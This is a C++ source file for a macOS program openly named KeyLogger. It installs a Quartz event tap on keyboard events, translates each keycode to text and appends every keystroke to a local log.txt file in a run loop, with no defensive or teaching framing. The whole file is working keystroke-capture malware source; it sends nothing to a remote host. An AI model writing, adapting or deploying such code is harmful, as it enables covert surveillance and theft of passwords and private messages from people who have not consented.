//
//  main.cpp
//  KeyLogger
//
//  Created by Sarvesh Bhatnagar
//

#include <iostream>
#include <ApplicationServices/ApplicationServices.h>
#include "RUIHeader.h"
#include <fstream>
//Start File operation.

#define out std::cout
#define endl std::endl

int logno = 0;
std::ofstream fw;

CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type,CGEventRef event, void *refcon)
{
    if ((type != kCGEventKeyDown) && (type != kCGEventKeyUp))
        return event;
    
    CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    char* a;
    a= keyStringForKeyCode(keycode);
//    out<<a;//log to console
    fw<<a;//Log to log.txt thisissomesaving
    
    static int count = 0;
    
    if (count < 10) {
        count++;
    }else{
        fw.close();
        fw.open("log.txt",std::fstream::app);
        if (!fw) {
            out<<"Failed to create log"<<endl;
        }else{
//            out<<"LOG Saved "<<endl; //optional.
        }
        count = 0;
    }
    
    
    return event;
}

int main(){
    fw.open("log.txt");
    CFMachPortRef      eventTap;
    CGEventMask        eventMask;
    CFRunLoopSourceRef runLoop;
    
    //http://mirror.informatimago.com/next/developer.apple.com/documentation/Carbon/Reference/QuartzEventServicesRef/QuartzEventServicesRef.pdf
    //Page 43 for event Mask. basically it contains all the events of interest.
    eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventKeyDown) ;
    eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault,
                                eventMask, myCGEventCallback, NULL);
    
    //Verifying if event tap is created.
    if (!eventTap) {
        out<<"Failed"<<endl;
        exit(1);
    }
    
    runLoop = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoop,kCFRunLoopCommonModes);
    
    // enabling event tap. refer quartzeventservicesref.pdf
    CGEventTapEnable(eventTap, true);
    CFRunLoopRun();
    
    exit(0);
    
    return 0;
}
